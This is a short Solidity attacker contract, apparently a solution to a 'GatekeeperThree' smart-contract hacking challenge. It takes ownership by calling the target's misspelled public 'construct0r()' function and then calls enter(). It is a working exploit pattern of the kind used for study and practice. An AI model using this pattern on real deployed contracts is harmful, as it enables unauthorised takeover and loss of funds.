// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree  {
    function construct0r() external;
    function enter() external; 
}

contract GatekeeperThreeAttacker {
    IGatekeeperThree public challenge;

    error NotEnoughBalance();

    constructor(address challengeAddress) {
        challenge = IGatekeeperThree(challengeAddress);
    }

    function setOwner() public payable { 
        challenge.construct0r();       
    }

    function attack() public payable { 
        challenge.enter();       
    }

    //contract cannot receive any ETH
    //receive() external payable {}
}